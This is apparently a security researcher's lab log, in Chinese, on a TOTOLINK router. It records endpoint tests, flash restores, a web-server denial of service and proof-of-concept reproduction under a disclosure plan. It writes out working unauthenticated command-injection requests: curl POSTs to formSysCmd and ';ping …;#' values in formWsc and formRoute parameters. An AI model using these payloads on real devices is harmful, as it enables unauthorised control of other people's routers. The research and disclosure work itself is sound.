      +5.84  Jump to image start=0x80500000
      +32.50 boa: starting server pid=350, port 80
      +38.76 **第一個 HTTP 200**
      判定: ✅ 成立(預測 < 40 秒)
      反證檢查: 測前寫「**明顯**超過 40 秒 → bootlog 時間戳不是牆鐘時間,
                或有服務是延遲啟動的」。38.76 不是明顯超過
      ⚠️ 但餘裕只有 1.24 秒,而 **t=0 是第一個 console 字元不是通電瞬間**,
         所以 38.76 是下界。而且 boa 自報啟動之後還有 6.3 秒不能服務。
         這一項的用途是「掃太早會把沒起來的服務讀成關的」——實務結論是**等 45 秒**

T-11  P9-1    bootloader 能不能傳 kernel cmdline         (靜態,11:1x 補動態)
      A 儀器: loader stage 2(flash 0x0012F0 起 LZMA, 17,334 -> 56,592)
              13 個 cmdline 形狀的針 -> **0 命中**
              同一次掃描找到 `?` 印的全部 17 個指令(找不齊就拒絕出報告)
      B 儀器: 裝置 console 的 `?` -> 16 條,與 A 的字串表逐條相符
      C 儀器: kernel(flash 0x060010+0x2808 起 LZMA, 976,470 -> 3,374,772)
              0x2f9590  console=ttyS0,38400 root=/dev/mtdblock1   ← 沒有 init=
              0x2d8590  No init found.  Try passing init= option to kernel.
              "Kernel command line" -> **ABSENT**
      D 觀測: 開機 log 全程沒有 `Kernel command line:` ——
              而 C 說那個字串不在 image 裡,所以它**永遠印不出來**
      判定: ❌ 反證成立(static)
      反證檢查: 測前寫「改了 init 之後仍然進正常開機 → cmdline 不是從
                bootloader 傳的」。**前件無法構成** —— loader 沒有任何指令
                可以表達它。而 C 顯示 kernel 會認 init=,缺的完全在 loader 那側

T-12  P3-13   未認證的設定「寫入」端點盤點              11:2x
      工具: bench-probe writes(**GET only,一個 handler 都沒執行**)
      全部 57 個 /boafrm/formX      -> 302 → home.htm  (門沒跑)
      全部 57 個 /boafrm/formX.htm  -> 302 → login.htm (門跑了,擋掉)
      唯一例外: formLogin.htm -> 404 —— `formLogin` 在豁免清單上
      測試自己點名的三個(formUpload / formPasswordSetup / formSaveConfig)
      與其餘 54 個**完全同一種行為**
      判定: ✅ 成立
      反證檢查: 測前寫「寫入類被擋而讀取類沒被擋 → 門不是純 URI 字串比對」。
                兩類逐一相同,不成立

T-13  P1-4    57 個端點 POST 存在性                      11:3x / 11:4x
      跑了兩次,結果高度一致:
        送出 POST 34 / 36    有回應 31 / 32    無回應 3 / 4
        狀態碼: 200 ×4, 302 ×27–28,**零個 404**
        302 去向: msg.htm ×13, status.htm ×11–12, countDownPage.htm ×2,
                  login.htm ×1(= formLogout,合理)
        依名字拒打: 13(拒絕清單,理由逐條在 RUNBOOK §8.12.12)
      **formSysCmd -> 302 → status.htm, 10 ms** ← W05 DoD 第 5 項 (b) 關掉
        而它可證明沒有執行任何東西:handler 是
        `if (*cmd != '\0') { … system(buf); }`,而 sysCmd 缺席
      判定: 🔶 部分
      反證檢查: 測前寫「大量端點回 404 或連線中斷 → **先確認是不是自己把
                boa 打掛了**,再下端點不存在的結論」。
                連線確實中斷了,而我們確認了是自己打掛的 —— 逐項 elapsed_ms、
                會重試的對照組、以及 console 全程無訊息
```

## 這一場最重要的一個計畫外結果

**未認證、不帶任何參數的 POST,可以把這台唯一的 web server 佔住好幾秒;
連續約 45 個就把它徹底弄掉,而且它不會自己回來。**

```
9650 ms  POST /boafrm/formPortFw          6009 ms  POST /boafrm/formSysLog
6359 ms  POST /boafrm/formPocketWizard    6008 ms  POST /boafrm/formRoute
                                          6007 ms  POST /boafrm/formWlanSetup
```

`boa` 在這台是**單一 process**(`boa: starting server pid=350`),handler 呼叫
`system()` / `execl()` 期間它不回到 accept 迴圈,backlog 滿了之後新連線被拒。
兩次獨立的掃描都在第 45 個附近死掉。死掉之後:

- `ping` 全程正常 —— **kernel 活著,只有 boa 不見了**
- console **一行訊息都沒有** —— 沒有 oops,沒有任何字
- 超過 20 分鐘後 `boa` 仍然沒有回來 —— `rcS` 是一次性啟動它的,不是 respawn

**這與 `P4-1`(不帶 submit-url 往唯讀段 strcpy)是不同的一條。** 這一條**帶**
`submit-url`,而且完全合法。歸類與影響評估留給 W06/W07,`docs/disclosure.md`
先記一筆。

## 這一場的四個儀器缺陷

1. **`console-dump.py` 擋掉 `AUTOBURN` —— 在這一格是反的。** 那是唯一一個
   「讓後面每件事變安全」的指令,擋掉它等於把它推回給手指,而旁邊就是相反的值。
   → 新增 `rescue` 子指令,**只送得出 0**,而且驗回應。
2. **說明文字不是語法。** `AUTOBURN: 0` / `IPCONFIG:<addr>` 都回 `Unknown
   command !`;loader 的字串表把指令 token 和說明行分開存。這是這顆 loader
   第三次文件與 parser 不一致(前兩次:`HELP` 不能用、`FLR`/`FLW` 的 Y 提示標點)。
3. **`bench-probe` 中止時一個 byte 都不寫。** 它偵測到最有價值的事件,然後在
   同一個動作裡把該事件的證據銷毀 —— 59 筆回應連同逐項 elapsed_ms。
4. **`set -o pipefail` + `grep -q` 又來一次**,由我,寫進守衛套件裡,
   而 `PROGRESS.md` 當天就把它記為儀器 bug 15。

## 這一場燒掉了什麼

| | |
|---|---|
| flash 寫入 | **零** —— `FLR`/`DB` 全是讀 |
| 裝置設定 | **有改,而且是計畫內的**:約 70 個 handler 被 POST 執行過(兩輪) |
| web 服務 | `boa` 目前不在。**斷電重開即復原**,不需要救援路徑 |
| 不可逆 | 無 |

> 🔴 **下一場的 IoC 預檢不會是 4 / 343,而那是預期的。**
> 凍結條件是對「這一場之前」的狀態寫的。POST 輪之後基準必須重新建立,
> 而重建的方式是**歸因**而不是重設:POST 之後的 64 KiB 快照與
> `config-region-20260817-1102-pre.bin` 逐欄位比對,差異逐項對到哪一輪。
> **看到不是 4 就當資安事件處理是錯的 —— 先讀這一段。**

## POST 之後的快照,以及歸因

```
T-14  P0-10   64 KiB 快照(POST 之後)                    12:0x
      檔名: dumps/config-region-20260817-post.bin   sha256 2c7fd9c4…
      與 pre 逐 byte: **14,068 bytes 不同**

      分區:
        0x00000-0x06000  boot loader                      UNCHANGED
        0x06000-0x08000  H601 (MAC + 射頻校準)            **UNCHANGED**
        0x08000-0x0c000  COMPDS 出廠預設                  7,105 bytes changed
        0x0c000-0x10000  COMPCS 現行設定                  6,963 bytes changed

      三份解碼全部 checksum_ok=True / verdict=consistent / 344 筆
```

**歸因成立,而且它比預期的嚴重。**

| | |
|---|---|
| COMPCS 改了 | **19** 個欄位 |
| COMPDS 改了 | **23** 個 = 同樣那 19 個 **＋ 原本區分兩者的那 4 個** |
| 那 4 個的方向 | `CHECK_SSID_OK` `0→1`、`DHCP_LEASE_TIME` `0.0.0.0→0.0.1.224`、`MIB_VER` `0→1`、`WLAN_SSIDS` 全零→現行值 —— **每一個都是 COMPDS 移動到 COMPCS 的值** |
| 新基準 | COMPCS vs COMPDS 現在差 **0 / 343** |

**所以:一次未認證的設定寫入,同時把出廠預設區覆蓋成現行設定。**

這一句話有兩個後果,第二個比第一個重要:

1. **`PROGRESS` 開放 #20 答完了。** 它問「`flash set` 對設定 MIB 不落地、
   `flash write-current` 也沒寫,那到底什麼東西會持久化 COMPCS」。
   答案:**一個未認證的 form handler POST**,而且它同時寫兩區。
2. **在這個 build 上,「恢復原廠設定」還原的是攻擊者寫進去的那一份。**
   `P9-9` 的預測是「reset 會把 COMPCS 覆寫回 COMPDS」。如果那成立,
   而 COMPDS 已經等於被改過的 COMPCS —— **reset 按鈕不是復原路徑。**
   唯一的復原是從裝置外的副本重寫。

> 🔴 **而 `P9-9` 被延到 W07 的理由,正是為了保護這 4 / 343。**
> 它被一個沒有任何警告標籤的測試毀掉了。
> **風險登記簿的失效模式不是漏掉危險的動作,是把危險寫在響亮的那一個上面。**

**改掉的欄位,沒有一個往危險的方向走**(值只印旗標,不印識別碼):

```
SSH_ENABLED               1 -> 0        UPNP_ENABLED              1 -> 0
PING_WAN_ACCESS_ENABLED   1 -> 0        ALG_SIP_ENABLED           1 -> 0
VPN_PASSTHRU_{IPSEC,L2TP,PPTP}_ENABLED  1 -> 0
AUTHG_LOGIN               0 -> 1        IGMP_PROXY_DISABLED       0 -> 1
DHCP_ROUTE{1,2,3}         0 -> 1        IPV6_ULA_MODE             0 -> 1
DHCP_MTU_SIZE          1500 -> 0        NOTICE_ENABLED            0 -> 208  ★
```

★ **`NOTICE_ENABLED` 被寫成 208。** 那是一個布林旗標,而 handler 在參數缺席時
把一個不是 0 也不是 1 的值寫了進去 —— 「accessor 的預設值」不是零,是別的東西。
`form_formNotice` 是唯一只呼叫 `system()` 的 handler。**這是一條線索,不是結論。**

**還原路徑(不在本場的上限內,建議排在 W06 開場):**

```
pre 快照:  dumps/config-region-20260817-1102-pre.bin   (與 8/16 完整 dump 的前 64 KiB 相同)
要還原的:  0x8000-0xC000 (COMPDS) 16 KiB —— COMPCS 是現況,不需要還原
方法:      FLR 讀出比對 -> EB 灌 RAM -> FLW 寫回 -> 新 RAM 位址讀回驗證
           今天已知 FLW 是讀-改-抹-寫回且保留磁區,所以 16 KiB = 4 個磁區
```

## 下一場從哪裡開始

**W05 = 登記簿 27/27。** 這一場結束時裝置的狀態:

| | |
|---|---|
| 電源 | 停在 `<RealTek>`(拍完快照之後沒有再開機) |
| `boa` | 上一次開機時被 POST 輪弄掉了;**斷電重開即恢復** |
| COMPDS | **已被覆蓋為 COMPCS 的內容**。副本在 `config-region-20260817-1102-pre.bin` 和 8/16 完整 dump |
| `H601` | 未動 |
| IoC 凍結條件 | **不再是 4 / 343,是 0 / 343** —— 這是預期的,見上 |

**W06 開場的三件事,照這個順序:**

1. **還原 COMPDS**(上面那段),然後重新建立 IoC 基準 —— 之後才有對照組
2. `RUNBOOK` §8.12.0 的 W06 組合:1 → 2 → 3 → 4 → 8
3. **懸著的兩件**:TFTP GET 會吐記憶體內容(可能是把 4 MiB 讀取從 105 分鐘變成幾秒的路徑);
   以及那條未認證 POST 讓 `boa` 停擺、不自我復原的路

## 對標頭的兩處更動,以及一個沒解決的矛盾

**1. 標頭加了「要配合 `test-ledger.md` 一起看」。** 單獨讀本檔會把過程讀成結論。
同時 `test-cases.toml` 與 `test-ledger.md` 從 `study/` 移到 repo 根目錄 ——
理由是可發現性:一個第一次打開這個 repo 的人看得到根目錄,不會知道要進 `study/`。

**2. 標頭原本複述了一條遮蔽規則,現在改成指向 `docs/disclosure.md`。**
理由是這個 repo 自己的規矩:**一份狀態只有一個擁有者**。標頭複述規則,就是第二個擁有者。

> 🔴 **而複述的那一份已經跟現實不符,這一點必須寫下來而不是修掉。**
> 標頭原本寫「per-unit 識別碼(MAC、SSID、`config.dat` 內容、射頻校準值)不寫進來」,
> 而 **2026-08-17 上午那一場的 `R1` 段落裡有兩個 MAC 位址**(隔離確認的
> 「剛好兩個 MAC」)。本檔只追加,所以那一段不動。
>
> **兩種可能,而我不打算替作者選:**
> - 那條規則是對的 → 上午那一段是違規,要走一次 git 歷史重寫,而那是一個
>   有成本、要作者決定的動作;
> - `docs/disclosure.md` 的 per-field 決定(自購、已停產、從未部署)涵蓋 MAC
>   → 那條規則本身寫得太寬,該由 `docs/disclosure.md` 收斂。
>
> **這是 W06 的第一件事,而不是一個註腳。** 公開的 repo 裡有一個
> 「說不寫卻寫了」的欄位,對敵意讀者而言那不是疏忽,那是關於這個專案自我檢查
> 有多可靠的資料點。


---

# 2026-08-17（夜）— W06 PoC 重現

**要跑 `A1.1` → `A2.1` → `A2.2` → `A2.3` → `A2.5` → `A2.6` → `A3.1` → `A3.2`
→ `A3.5`（抽驗）→ `A3.6` → `A3.7` → `A3.9` → `A3.10` → `A2.2` → `A2.3`
→ `A3.11` → `A3.12` → `A4.1`。**
目標：**G4**，以及登記簿 W06 的 27 項全部關掉（17 項跑、10 項改期）。

## 這一場之前，桌面上先做完的事（不碰裝置）

**這一段存在的理由是：其中一件事沒做完，這一場就不能開始。**

| | |
|---|---|
| **`tools/console-write.py`** | **本場的前提，而它在今天之前不存在。** `A2.6` 要寫回 16 KiB，而 `console-dump.py` 刻意送不出 `FLW`。白名單只有兩段（演練區 `0x3F0000`、設定區 `0x008000`–`0x010000`），**bootloader 與 `H601` 由建構上搆不到** |
| **`tools/test-console-write.sh`** | 25 案例。第一次跑 19 過 6 敗，六個都是真的：三個是測試自己的 `grep` 少了 `--`、一個是工具的訊息比預期更好、一個是 `grep -c 'FLW '` 連標題行都數、一個是 docstring 提到了斷言不准出現的 token |
| **儀器 bug 23** | `console-dump.py` 的 `rescue` 仍在教操作員「`ping` 有回應就是 `P9-3` 成立」——**8/17 當天就被否證**（loader 無 ICMP、MAC 是從 IP 合成的）。活下來的原因與 bug 22 同構：`check-runsheet.py` 讀兩份 markdown，**沒有人讀工具自己印的字** |
| **儀器 bug 24** | `make doctor` 的直連判斷用 `/proc/net/route`，但**預設路由匹配所有目的地**，所以「沒有路由」那個分支是死碼。它把「網段還沒設定」報成「網卡在 Windows 側」，**並叫操作員去做他剛做完的事** |
| **`PROGRESS` 開放 #33 關掉** | 三支守衛套件（35 案例）從來沒進 CI。全部接上 + 新的那支：**`make ci` 的守衛案例 89 → 149，九支套件總數也是 149，缺口 0** |
| **runsheet `A2.6` / `A3.9` / `A3.10` / `A3.11` / `A3.12`** | 五節新程序 + `RUNBOOK` §8.12.17–21 五段「為什麼」，一對一 CI 檢查 |

## 這一場的計畫（動手之前寫的）

| 目標 | 事先寫下的成功條件 |
|---|---|
| `A2.6` 還原 `COMPDS` | **分段判據**：`0+32768` 相同（loader 與 `H601` 沒動）、`32768+16384` 相同（`COMPDS` 還原）、`49152+16384` **不同**（`COMPCS` 是 8/17 現況）。三段都要對 |
| `P3-3` `formSysCmd` | **不帶憑證**，抓到來源 `10.1.1.1` 的 **ICMP type 8**（echo request，不是 reply）×3 |
| `P3-3` 的第二半 | 帶憑證那一發行為**相同** —— 否則「未認證」這個主張排除不掉「我不小心帶了什麼」 |
| docroot oracle | `GET /w06.txt` 回 `TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002`。**空檔不算成功** |
| `P5-5` | `/proc/cpuinfo` 取得回來，而且能讀出核心名字 |
| `P3-1` / `P3-2` / `P3-4` | 同樣的 ICMP 判據。`P3-4` 預期**不**成立（R2 的 6 個 site 不含它） |
| `P3-7` | GET 那一發預期**不**執行（`translate_uri` 先 302） |
| `P3-5` 第 ⑤ 環 | `config-attrib.sh` 指出 `HW_WLAN0_WSC_PIN` = `13572468`，且 **`H601` UNCHANGED** |
| `P10-3` | 未認證改密碼後，舊憑證 302、新憑證 200 |
| `P10-4` | 密碼設空之後，**不帶任何憑證**拿得到 `password.htm` |
| `P4-1` | 一個不帶 `submit-url` 的 POST 之後 `boa` 不再回應 |
| `P4-3` | 100 byte 以上時裝置**自己重開機**（`.bss` 佈局 → `needReboot`） |
| `P10-10` | 收工快照的每一個差異 byte 都指得出是哪一項造成的 |

## 這一場事先決定、而且要被 diff 證明是事先決定的四件事

1. **`P3-2`（`formRoute` / `subnet`）的請求不寫進任何 committed 檔案。**
   它是 `docs/disclosure.md` 的 `D-1`：本專案自己找到、無 CVE、**未通報**。
   規則是「發現可公開、重現跟著揭露狀態走」，而今天是那條規則第一次真的咬到自己。
   `runsheet.md` `A3.9.6` 只給形狀，handler 與參數名指回 `test-ledger.md` 的那一列。
2. **`poc/` 在這一場之後才寫，不在之前。** 這樣裡面每一條命令都是**跑過的**，
   而不是我認為會動的。G4 的第五條要「腳本會失敗，而且說得出是哪一步」——
   一份沒跑過的腳本連自己會不會失敗都不知道。
3. **今天不寄任何東西給 TWCERT/CC。** 逐 handler 重跑 prior-art、更新
   `docs/disclosure.md` 的狀態欄、把報告草稿放進 repo —— **寄出是作者的動作**，
   而 90 天公開時鐘什麼時候起算由作者決定。
4. **`P4-5` 之後的 Phase 4/5 十項改期到 W07，理由不是時間。**
   `boa` 掛掉沒有東西會重起它（一次 ~45 個畸形請求，之後要斷電重開），
   而 `boa` 在 `qemu-user` 下連一個 GET 都服務不了（對齊陷阱）——
   **fuzz 在實機與模擬兩邊都被擋住**，先建全系統模擬才有意義，那是一件獨立的事。
   `P5-1` 更直接：這台沒有 shell、沒有 gdbserver，**`epc` 的 oracle 目前不存在**。

## 這一場明確不做的

- **不做 reverse shell。** 已經有 root 執行、有 flash 上的證據，
  reverse shell 只是同一件事的第四種呈現（plan/W06 §六的禁令）。
- **不追新 handler、不 fuzz、不打 XSS。** 全部是 W07。
- **不碰 UPnP 的 SOAP action。** 52869 是 CVE-2014-8361 的埠、在 CISA KEV 裡，
  而它有公開的武器化程式碼。今天連它的描述文件都不再抓。
- **不按 reset 鈕**（`P9-9`，W07，而且它會刪掉 `A2.6` 才剛還原的判別力）。

## 為什麼順序長這樣

**進站要燒開機循環，所以同一站的節一次做完** —— 但今天有一個地方**必須**回頭：
`A3.10` 的 flash 差異要「注入前」與「注入後」各一份快照，而快照在第 2 站。
所以第 2 站會進兩次，第二次只為了 `A2.3`。

**`A3.11`（改密碼）排在 `A3.6`+`A3.7` 之後不是禮貌**：那兩節的內容是
「從自己 flash 解出來的密碼可以登入」，而 `A3.11` 會把那個密碼換掉。
順序反了不是順序不好，是把這個專案最硬的一條證據毀掉。

**`A3.12` 排最後**，因為它會讓 `boa` 消失，而之後每一項的結果都會變成
「連不上」——那跟「端點不存在」長得一模一樣。

## 紀錄卡（2026-08-17 夜，每項一張）

> 🔴 **這一節第一版寫成了敘事段落，九段裡有六段沒有反證欄，同一晚改寫成本檔標頭的
> §「一張紀錄卡長什麼樣」。** 原因寫在那一段：那個模板當時不在任何 committed 檔案裡。
> **改寫本身違反「只追加」的字面，而理由是 append-only 要防的是事後竄改證據，
> 不是同一場之內把記錄補成規定的形狀** —— 兩個版本都在 git 裡，diff 可審計。
> 這是本檔第一次發生這種事，寫在這裡而不是註腳。

```text
T-22  P0-9   qemu 模擬環境：boa 到底服不服務得了請求        18:5x（桌面，未接裝置）
可行性: ★★   驗證狀態(測前): other-build   依據: W01 只證明 binary 載入得起來
送出（逐字）:
      sudo chroot $ENVDIR ./qemu-mips-static -strace /bin/boa -d -f /var/boa-8080.conf
      sudo bash tools/qemu-env.sh serve 8080
      curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/login.htm
      curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/blank.htm
原始回應:
      login.htm  200        blank.htm  302        status.htm  200 / 30087 B
      Server: Boa/0.94.14rc21
觀測通道 1（strace）:
      412 open("/dev/mtdblock0",O_RDONLY) = 3
      412 lseek(3,49152,SEEK_SET) = 49152
      412 read(3,0x490018,7490) = 7490
      412 open("/web/config.dat",O_RDWR|O_CREAT|O_TRUNC,0400000) = 3
      --- SIGBUS {si_signo=SIGBUS, si_code=1, si_addr=0x00492b41} ---
觀測通道 2（控制組）:
      /bin/flash get IP_ADDR → 10.1.1.1（guest binary 讀得到 shim）
      guest 的 /bin/wget 對主機 HTTP server 完成一次交易，1208 bytes
UART console 當下輸出: 不適用（未接裝置）
判定:  ✅ 成立 —— 但 W05 的結論要撤回
反證檢查: 測前寫下「shim 之後 boa 仍無法完成一次 GET → 桌機 fuzz 路線不成立」，
          實際看到 三個頁面都有回應，而且閘門行為（豁免 200 / 受保護 302）
          與 W04-2 逐指令讀出來的模型一致
這一步燒掉了什麼: /web/config.dat 在模擬環境裡被改成一個目錄（那正是讓 server 起來的
          手段）。實機不受影響
驗證狀態(測後): dynamic（模擬）   下一步: 用**下載得到的** V2.1.2 建同樣的環境 = G4 第三條
```

```text
T-23  —      A2.6 還原 COMPDS：本檔第一次寫 flash 到真實位址   21:0x–21:2x
可行性: ★★★★ 驗證狀態(測前): 無（本節今天才存在）  依據: runsheet A2.6，今晨才寫
送出（逐字）:
      python3 -u tools/console-write.py probe-eb --at-prompt --sizes 8 16 32 64
      python3 -u tools/console-write.py drill --at-prompt --eb-bytes 16
      python3 -u tools/console-write.py write --at-prompt \
          --flash 0x8000 --confirm 0x8000 --length 0x4000 \
          --input $D/compds-restore.bin --expect-sha256 7c31b51c8857… --eb-bytes 16
原始回應:
      ok      8 bytes on one line: 8/8 landed
      ok     16 bytes on one line: 16/16 landed
      fail   32 bytes on one line: 17/32 landed
      ok    flash 0x000000 -> 0b f0 00 04            ← 正對照
      （四個磁區，每一個都 staged and verified in RAM 之後才 FLW ok）
      ok    16384 bytes match, sha256 7c31b51c8857…
觀測通道 1（獨立第二次讀取，console-dump 而非 console-write）:
      boot loader 0x0-0x6000     same
      H601 0x6000-0x8000         same
      COMPDS 0x8000-0xC000       same    ← 同時對上 8/17 快照與 8/16 完整 dump
      COMPCS 0xC000-0x10000      DIFF    ← 本節沒碰它，本來就該不同
觀測通道 2（語意層）: COMPCS vs COMPDS = 23 / 343
UART console 當下輸出: 全程 <RealTek>，無 Unknown command，無 Abort
判定:  ✅ 成立
反證檢查: 測前寫下「三段判據任何一段不符 → 停，尤其第一段，那裡面有 H601」，
          實際看到 三段全中
這一步燒掉了什麼: COMPDS 四個磁區各被讀-改-抹-寫回一次。演練區 0x3F0000 / 0x3F0100
          各 8 bytes 被寫過並抹回。**後來本場自己的 POST 又把 COMPDS 蓋掉了（見 T-37）**
驗證狀態(測後): dynamic   下一步: 還原要排在一場的**最後**，不是開頭
⚠️ **測前寫下的預期值「回到 4 / 343」是錯的。** 實測 23，而 23 是對的：差異是
   兩個區域之間的，本節只還原一個。4 +（8/17 POST 改掉 COMPCS 的 19）= 23。
   那個 19 在 W05 是比對兩份快照算的，這次是同一份快照裡比對兩區算的 ——
   **兩條不共用程式碼的路徑，同一個數字。一個寫錯的預期值換到一次佐證。**
```

```text
T-24  P10-1  未認證 GET /config.dat，以及一個 W05 沒有的對照   21:4x
可行性: ★★★★ 驗證狀態(測前): dynamic（W05 已關）  依據: 本場作為鏈的第①環重跑
送出（逐字）:
      curl -s -D headers.txt -o config.dat http://10.1.1.1/config.dat
原始回應:
      HTTP/1.1 200 OK
      Date: Wed, 10 Jan 2018 06:52:28 GMT
      Server: Boa/0.94.14rc21
      7507 bytes，前 6 bytes = COMPCS
觀測通道 1（對 flash）:
      served (HTTP over Ethernet) : 9318d1acdb04b58eba22f948ed3c36cc
      flash  (FLR+DB over UART)   : 9318d1acdb04b58eba22f948ed3c36cc   IDENTICAL
觀測通道 2（新鮮度對照，W05 沒做）:
      對 8/16 完整 dump: **differs** —— 差異正是 8/17 POST 輪改掉的欄位
UART console 當下輸出: 無（純 HTTP）
判定:  ✅ 成立，而且比 W05 那次強
反證檢查: 測前寫下「served 與 flash 不同 → 範圍或長度取錯，不准調範圍去湊」，
          實際看到 逐 byte 相同，長度取自檔案大小不是硬編
這一步燒掉了什麼: 無（純讀）
驗證狀態(測後): dynamic   下一步: 那個「對今晚相同、對上週不同」才是排除
          「boa 服務一份固定副本」的那一步，要寫進 poc/01
```

```text
T-25  P10-2  config 檔名字典掃描                            21:5x
可行性: ★★★  驗證狀態(測前): unverified   依據: w6cg bundle 的 143 個實際檔名
送出（逐字）:
      # 字典 = bundle 的 143 個檔名 + 13 個不在裡面的疑犯
      curl -s -o /dev/null -w '%{http_code}' -m 5 "http://10.1.1.1/${p#/}"   # 逐條
原始回應: 83×302 / 73×200 / 3×000
觀測通道 1（13 個疑犯）:
      200 config.dat
      302 config.bin / backup.dat / romfile.cfg / cfg.dat / nvram.bin /
          settings.dat / config.dat.bak / sysconf.dat / COMPCS / config /
          backup_settings.conf / var/config.dat
觀測通道 2（bundle 外的 200）: 只有 config.dat —— boa 啟動時自己建的
UART console 當下輸出: 無
判定:  ✅ 成立
反證檢查: 測前寫下「掃到 143 檔以外的檔案 → docroot 不只是 w6cg 展開的內容」，
          實際看到 只有 config.dat，而它不是「別人放的」是 boa 自己建的
這一步燒掉了什麼: 無（156 個 GET，零失敗）
驗證狀態(測後): dynamic   下一步: P1-3 / P3-10 / P3-11 的前提（docroot 就是那 143 檔）成立
⚠️ 那 3 個 000 **是我自己的存活對照行** —— 為了對齊欄位我把它排版成 000 開頭，
   於是它跟「請求失敗」在統計裡一模一樣。沒查的話會變成「三次失敗」進紀錄。
```

```text
T-26  P2-7/P2-8  憑證與 session（本場為鏈的第②③環重跑）      21:5x
可行性: ★★★★ 驗證狀態(測前): dynamic（W05 已關）  依據: 從本場自己抓的 config.dat 解
送出（逐字）:
      fwrecon compcs $D/w06-config-dat.bin --offset 0 --mib …/libapmib.so \
          --disclosure open -f json
      curl -s -o /dev/null -w '%{http_code}' -u "$USER:$PASS" http://10.1.1.1/password.htm
原始回應:
      correct credentials : HTTP 200
      no credentials      : HTTP 302
      wrong password      : HTTP 302
觀測通道 1: Set-Cookie 標頭數量 = 0
觀測通道 2: 憑證長度 5 / 5（值不寫進本檔）
UART console 當下輸出: 無
判定:  ✅ 成立
反證檢查: 測前寫下「解出來的值登不進去 → COMPCS 的解碼錯了」，實際看到 200
這一步燒掉了什麼: 無
驗證狀態(測後): dynamic   下一步: T-32 會把這組憑證換掉，所以順序不能反
```

```text
T-27  P3-3   formSysCmd 未認證命令執行（CVE-2024-51228）      22:0x
可行性: ★★★★★ 驗證狀態(測前): static   依據: W04-2 讀出 handler 在 0x004838a8
送出（逐字，本項已公開自 2024-11-27，照原樣寫）:
      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
        --data-urlencode 'sysCmd=ping -c 3 10.1.1.100' \
        --data 'submit-url=/syscmd.htm'
      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
        --data-urlencode 'sysCmd=cat /etc/version > /var/web/w06.txt;#' \
        --data 'submit-url=/syscmd.htm'
原始回應: HTTP 302  in 0.613598s（無 Authorization 標頭）
觀測通道 1（tcpdump ICMP）:
      控制組  10.1.1.100 -> 10.1.1.1  type 8 ；10.1.1.1 -> 10.1.1.100  type 0
      注入後  10.1.1.1 -> 10.1.1.100  type 8  ×4，seq 0/1/2/3，間隔 1 秒
觀測通道 2（docroot 回寫）:
      GET /w06.txt → TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
      同一發拿掉 ;# → HTTP 204，0 bytes（檔案建立了、內容是空的）
UART console 當下輸出: 無（console 全程無異常，這正是盲注的意思）
判定:  ✅ 成立，未認證
反證檢查: 測前寫下「未帶憑證收到 301 到登入頁，或命令沒有執行痕跡 → 『未認證』的
          讀法錯了，NVD 的 PR:H 是對的」，實際看到 302 而非 301 到登入頁，
          且四個 echo request；**再加一發帶憑證，行為完全相同**
這一步燒掉了什麼: /var/web 三個檔（ramfs）；COMPCS 的 SYSCMD_SELECT 欄
驗證狀態(測後): dynamic   下一步: D-6 從 held 變成可發布 → poc/02
⚠️ 要 3 個卻看到 4 個。序號 0..3 一秒一個，證明是 BusyBox 1.13.4 的 ping -c 3
   送四個，**不是 handler 跑了兩次**。四捨五入成「三個」就漏掉這個問題。
```

```text
T-28  P5-5   cat /proc/cpuinfo —— Lexra 那塊最後的拼圖        22:1x
可行性: ★★★★★ 驗證狀態(測前): static   依據: boa 用了 142 次 lwl/lwr/swl/swr
送出（逐字）:
      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
        --data-urlencode 'sysCmd=cat /proc/cpuinfo > /var/web/cpu.txt;#' \
        --data 'submit-url=/syscmd.htm'
原始回應: HTTP 302
觀測通道 1（docroot）:
      system type : RTL819xD        processor : 0
      cpu model   : 52481           BogoMIPS  : 398.95
      tlb_entries : 32              mips16 implemented : yes
觀測通道 2（同一條路多問三件事）:
      /proc/cpu → No such file or directory（沒有對齊修正計數器）
      dmesg     → 0 bytes
      /proc/version → Linux 2.6.30.9 (admin@office.hopeiot) (gcc 4.4.5-1.5.5p2)
                      #1526 Wed Jan 10 14:50:54 CST 2018
      /proc/meminfo → MemTotal: 26052 kB
UART console 當下輸出: 無
判定:  🔶 部分 —— 取得了，而它答不了那個問題
反證檢查: 測前寫下「cpuinfo 顯示的核心不支援那些指令 → 142 這個計數量錯了」，
          實際看到 **它根本不報核心名字**：cpu model 是十進位數字 52481。
          所以反證條件沒有觸發，預測也沒有被確認 —— 這一項是 partial 不是 confirmed
這一步燒掉了什麼: /var/web 五個檔（ramfs）
驗證狀態(測後): dynamic   下一步: 決定性的測試改成「掃描解壓後的 kernel 字串」，
          不需要裝置。W02 開放 #6 仍然開著，但開著的理由變了：**這台不報**
★ 順手拿到兩個東西：kernel 比 boa 早七分鐘建置（W02 的時間戳論證多一個來源）；
  MemTotal 26052 kB 修正 W02 的「fitted 與 usable 一致」—— 32 MiB 是 loader 偵測的
```

```text
T-29  P3-1 / P3-4 / P3-2  另外三個標的，以及那個能區辨的對照   22:2x
可行性: ★★★★★/★★★/★★★★★  驗證狀態(測前): static / presumed / static
依據: BoaGate R2 在 formWsc 指認 6 個 site；formRoute 三個 build 都指認到
送出（逐字。P3-2 原本要保留，**而它今晚被撤回了，所以保留的理由消失了**）:
      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
        --data-urlencode 'peerPin=1;ping -c 3 10.1.1.100;#' --data 'submit-url=/wireless.htm'
      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
        --data-urlencode 'targetAPSsid=1;ping -c 3 10.1.1.100;#' --data 'submit-url=/wireless.htm'
      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formRoute \
        --data-urlencode 'subnet=1;ping -c 3 10.1.1.100;#' --data 'submit-url=/route.htm'
      # 區辨對照：同一個 handler，換一個本專案逐指令讀過的參數
      curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
        --data-urlencode 'localPin=1;ping -c 3 10.1.1.100;#' --data 'submit-url=/wireless.htm'
原始回應: 三發都 HTTP 302；對照那一發 HTTP 000（逾時 15 s，但命令跑了）
觀測通道 1（tcpdump，判準是來源 10.1.1.1 的 type 8）:
      P3-1 peerPin        0
      P3-4 targetAPSsid   0
      P3-2 subnet         0
      對照 localPin       **4**
